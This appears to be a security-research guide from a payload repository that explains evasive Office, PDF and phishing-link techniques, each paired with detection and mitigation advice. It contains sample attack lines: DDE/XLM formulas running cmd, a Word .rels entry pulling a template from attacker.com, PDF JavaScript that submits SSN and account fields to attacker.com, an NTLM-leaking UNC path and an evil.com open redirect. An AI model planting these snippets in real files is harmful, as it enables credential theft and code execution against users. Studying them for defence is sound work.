# Evolved Payload Techniques

> **⚠️ DISCLAIMER**: This document is for **educational and research purposes ONLY**.
> Techniques described are to help security researchers understand attack evolution and
> build better defenses. Do not use without explicit authorization.

---

## Overview

This guide covers evolved versions of the existing payload techniques in this repository,
documenting how attackers adapt their methods to bypass modern defenses. Understanding
evolution patterns is critical for staying ahead of emerging threats.

---

## 1. Advanced DDE Evasion

### Background
Dynamic Data Exchange (DDE) payloads have been in use since 2017 but many organizations
have now disabled DDE via Group Policy or patched their Office applications. Evolved
techniques attempt to bypass these mitigations.

### Evolution Timeline
```
2017: Basic DDE in CSV/XLS/DOCX discovered
2018: Microsoft disables DDE by default, patches released
2018-2019: Attackers evolve to obfuscated DDE
2020+: Template injection and XLM macros replace DDE
```

### A. Base64-Encoded DDE

**Concept**: Encode the DDE formula to bypass signature-based detection.

**Directory**: `enhanced-payloads/dde-base64-encoded/`

**How It Works**:
```
Standard DDE: =CMD("cmd /c calc.exe","")
Encoded DDE:  =CHAR(61)&CHAR(67)...  (character code concatenation)
```

**Evasion Purpose**: Signature-based scanners looking for `=CMD` string won't match
character-code-concatenated versions.

**Mitigation**: Content analysis rather than signature matching; DDE disabled via policy.

---

### B. XOR-Obfuscated DDE

**Concept**: XOR encode the DDE payload string, decode at runtime using a second formula.

**Directory**: `enhanced-payloads/dde-xor-obfuscated/`

**Technical Approach** (educational):
```
Key = 0x42
Encoded payload = each byte XOR'd with key
Runtime formula: INDIRECT() used to decode and execute
```

**Mitigation**: Behavioral analysis of formula execution, not static string matching.

---

### C. Staged DDE

**Concept**: Two-stage approach where Stage 1 is a minimal downloader, Stage 2 is the real payload.

**Directory**: `enhanced-payloads/dde-staged/`

**Stage Flow**:
```
Stage 1 (CSV/XLS file):
  =CMD("cmd /c powershell -c [download stage2]","")
  
Stage 2 (downloaded from web):
  Full payload execution
  Persistence mechanisms
  Data collection
```

**Why It Evades**: Stage 1 only downloads a file — less suspicious behavior than full payload.
**MITRE**: T1105 (Ingress Tool Transfer)

---

### D. Environment Variable DDE

**Concept**: Use environment variables to construct payload strings, avoiding direct command strings.

**Directory**: `enhanced-payloads/dde-environment-vars/`

**Example** (educational):
```cmd
# Set up env vars first (via another mechanism)
SET c=cal
SET d=c.e
SET e=xe
# Then DDE references %c%%d%%e% = calc.exe
```

**Detection Challenge**: Environment variable expansion happens at runtime, not scannable statically.

---

## 2. Intelligent Credential Harvesting

### Evolution from Basic Credential Pages

**Basic (existing)**: Static HTML page mimicking Microsoft login.
**Evolved**: Dynamic, intelligent page that validates and proxies authentication in real-time.

### A. Real-Time MFA Capture (Adversary-in-the-Middle)

**Directory**: `enhanced-payloads/credential-mfa-capture/`

**How It Works**:
```
User → [Attacker Proxy] → Real Login Server
         ↓
         Captures: username, password, MFA token, session cookie
```

**Tools commonly used** (for detection/defense reference):
- Evilginx2: Reverse proxy for real-time credential capture
- Modlishka: Reverse proxy phishing framework
- Muraena: Phishing reverse proxy

**Why MFA Doesn't Help**: The proxy relays the MFA token immediately, so the real server
validates it and sends back a session token, which the proxy also captures.

**Defense**:
- FIDO2/Hardware keys (not vulnerable to AiTM)
- Conditional access policies (IP restrictions, device compliance)
- Impossible travel detection
- Token binding (when supported)

---

### B. Silent NTLM Hash Capture

**Directory**: `enhanced-payloads/credential-silent-capture/`

**How It Works**:
```
Word Document contains:
  - Reference to: \\attacker.com\share\image.jpg
  
When opened:
  Windows automatically attempts NTLM authentication
  NTLM hash captured by attacker-controlled SMB server
  No popup visible to user
```

**Tools for Capture** (for detection reference): Responder, Inveigh

**Required Network Access**: Outbound SMB (port 445) to internet

**Detection**:
```
- Monitor for outbound SMB connections (port 445) to internet IPs
- Alert on NTLM authentication to non-internal systems
- Block outbound SMB at perimeter firewall
```

**Mitigation**:
- Block outbound SMB at perimeter (port 445/139)
- Enable Network Level Authentication
- Use Kerberos-only authentication where possible

---

### C. Credential Validation

**Directory**: `enhanced-payloads/credential-validation/`

**Concept**: Before using stolen credentials, automatically validate them to confirm they work.

**Techniques**:
- POST to OWA/O365 login endpoint
- Test against public APIs that require authentication
- Try against VPN portals before pivoting

**Why It Matters**: Validates credential freshness before proceeding with attack chain.

---

### D. Auto-Submit to C2

**Directory**: `enhanced-payloads/credential-auto-submit/`

**Concept**: Captured credentials are immediately forwarded to C2 server via multiple channels.

**Transmission Methods**:
- HTTPS POST to C2
- DNS exfiltration (base64 in subdomain)
- Email to attacker (using victim's SMTP if available)

---

## 3. Advanced Office Macro Techniques

### Evolution from Basic Macros

Modern security tools detect macro-enabled documents. Evolved techniques focus on:
1. Encrypting or obfuscating VBA code
2. Using older/alternative macro engines
3. Injecting macros where they're not expected

### A. P-code Encrypted VBA

**Directory**: `enhanced-payloads/macro-pcode-encrypted/`

**Background**: VBA code compiles to p-code (pseudo-code) stored separately from the VBA source.
Some antivirus products only scan the source code, not the p-code.

**Technique**: Strip or corrupt the VBA source code while leaving working p-code.
```
VBA Source: (corrupted/removed - bypasses source-code AV)
P-code:     (still functional - executes the macro)
```

**Detection Challenge**: AV products that parse only VBA source are bypassed.
**Defense**: Tools like pcodedmp or OLEVBA that can analyze p-code.

---

### B. Excel 4.0 (XLM) Macros

**Directory**: `enhanced-payloads/macro-xlm-excel4/`

**Background**: Excel 4.0 macros predate VBA and use a different engine. Many AV products
and sandboxes have weaker detection for XLM macros.

**Example XLM Macro Cells**:
```
A1: =EXEC("cmd /c calc.exe")
A2: =RETURN()
```

**Auto-Execute**:
- Name the macro sheet "Auto_Open"
- Or use XLM's =REGISTER() and =CALL() for more sophisticated execution

**Detection**:
- Excel sheets named "Auto_Open" or with 4.0 macro format
- XLSB files (binary Excel) often used to hide XLM macros
- Enable "Block macros from running in Office files from the internet" policy

---

### C. Metadata Injection

**Directory**: `enhanced-payloads/macro-metadata-injection/`

**Concept**: Store payload code in document metadata/properties fields, reconstruct at runtime.

**Fields Used**:
- Author, Title, Subject, Comments fields
- Custom Document Properties
- Revision history

**Technique**:
```vba
' Read payload from document properties at runtime
Dim payload As String
payload = ActiveDocument.BuiltInDocumentProperties("Comments").Value
' Execute payload...
```

**Evasion**: Static analysis of VBA code doesn't reveal payload — it's in metadata.

---

### D. Template Injection

**Directory**: `enhanced-payloads/macro-template-injection/`

**How It Works**:
```
1. Attacker creates .dotm template with malicious macro
2. Attacker creates clean .docx that references the template remotely
3. Clean .docx sent to target (passes email scan - no macros)
4. On open, Word fetches template from remote URL
5. Template's macros execute
```

**Document Relationship** (in Word's .rels file):
```xml
<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
  Target="http://attacker.com/malicious.dotm" TargetMode="External"/>
```

**Evasion**: Initial document is clean; malicious content loaded at open time.
**MITRE**: T1221 (Template Injection)

**Detection**:
- Monitor for .docx files with remote template references
- Block template downloads from external URLs
- Inspect .rels files in Office documents

---

## 4. PDF Advanced Exploitation

### A. JavaScript in PDF

**Directory**: `enhanced-payloads/pdf-javascript-payload/`

**Common PDF JavaScript Actions**:
```javascript
// Launch dialog (requires user confirmation)
this.exportDataObject({cName: "payload", nLaunch: 2});

// Submit form to capture data
this.submitForm({cURL: "https://attacker.com/collect", cSubmitAs: "FDF"});

// Open URI
this.getURL("http://attacker.com/payload", false);
```

**Detection**:
- PDF analysis tools: peepdf, pdf-parser, PDFiD
- Adobe Reader security settings: disable JavaScript
- Sandbox detonation of PDFs

---

### B. Form Field Credential Capture

**Directory**: `enhanced-payloads/pdf-form-field-capture/`

**How It Works**:
```
1. Create legitimate-looking PDF form (IRS, HR, banking)
2. Add submit button that POSTs to attacker server
3. Form fields capture name, SSN, account numbers, etc.
```

**PDF Form Submission**:
```javascript
// PDF form submit button action
this.submitForm({
  cURL: "https://attacker.com/collect.php",
  cSubmitAs: "HTML",
  aFields: ["name", "ssn", "account"]
});
```

---

### C. Annotation Abuse

**Directory**: `enhanced-payloads/pdf-annotation-abuse/`

**Concept**: PDF annotations (especially URI and JavaScript annotations) can execute actions
that are not visible in the normal reading flow.

**Invisible Trigger**:
```
- White-on-white text with hyperlink
- Zero-size annotations at page boundaries  
- JavaScript in document open action hidden in annotation layer
```

---

### D. Launch Actions

**Directory**: `enhanced-payloads/pdf-launch-chain/`

**PDF Launch Action** (for detection reference):
```
/OpenAction << /Type /Action /S /Launch /F (cmd.exe) /P (/c calc.exe) >>
```

**Modern Behavior**: Adobe Reader shows confirmation dialog before launch.
**Evasion**: Social engineer user to click "OK" using convincing dialog message.

---

## 5. Advanced Link Manipulation

### A. Homograph Attacks

**Directory**: `enhanced-payloads/link-homograph-domains/`

**Concept**: Unicode characters that look identical to ASCII characters used in domain names.

**Examples**:
```
microsoft.com  →  mіcrosoft.com  (Cyrillic 'і' instead of Latin 'i')
paypal.com     →  pаypal.com     (Cyrillic 'а' instead of Latin 'a')
google.com     →  ɡoogle.com     (Unicode 'ɡ' instead of Latin 'g')
```

**Detection**:
- Browsers now show Punycode for mixed-script domains (xn--...)
- Certificate transparency monitoring
- WHOIS analysis for recently registered lookalike domains

---

### B. Right-to-Left Override (RTLO)

**Directory**: `enhanced-payloads/link-rtlo-bypass/`

**Technique**: Unicode U+202E reverses text display direction.

```
Filename creation:     evil‮fdp.exe
Displayed to user as:  evilexe.pdf
Actual file:           evil‮fdp.exe (exe file)
```

**Common In**: Email attachments, file sharing services, chat applications.

**Detection**:
- Alert on filenames containing U+202E
- File extension mismatch detection

---

### C. Typosquatting

**Directory**: `enhanced-payloads/link-typosquatting/`

**Types**:
```
Omission:   microsft.com   (missing letter)
Addition:   micrsooft.com  (extra letter)
Swap:       micorsoft.com  (transposed letters)
Substitute: m1crosoft.com  (number for letter)
TLD:        microsoft.net  (different TLD)
Prefix:     login-microsoft.com  (prefix addition)
Suffix:     microsoft-login.com  (suffix addition)
```

---

### D. XSS + Open Redirect Chain

**Directory**: `enhanced-payloads/link-xss-redirect-chain/`

**Chain**:
```
Legitimate site URL → Open redirect → Attacker site
Example:
  https://trusted-site.com/redirect?url=https://evil.com
  
User sees: trusted-site.com in email/message (trusted domain)
Lands on: evil.com/phishing-page
```

**Why It Works**: Email security tools may not follow redirects from trusted domains.

---

## Defense Summary

| Technique | Primary Defense | Secondary Defense |
|-----------|----------------|-------------------|
| Advanced DDE | Disable DDE via Group Policy | Behavioral monitoring |
| Staged Payloads | Block Office → network connections | EDR monitoring |
| MFA Capture | Use FIDO2 hardware keys | Anomalous login detection |
| NTLM Capture | Block outbound SMB | NTLM disable, Kerberos-only |
| Template Injection | Block remote template URLs | Content inspection |
| XLM Macros | Disable legacy macros | Behavioral sandboxing |
| PDF JS | Disable PDF JavaScript | Sandbox all PDFs |
| Homograph Domains | Browser Unicode policies | SSL certificate monitoring |
| RTLO Tricks | File extension analysis | Alert on U+202E |

---

*See [DETECTION_EVASION.md](DETECTION_EVASION.md) for attacker evasion strategies*  
*See [DEFENSE_STRATEGIES.md](DEFENSE_STRATEGIES.md) for comprehensive defensive guidance*
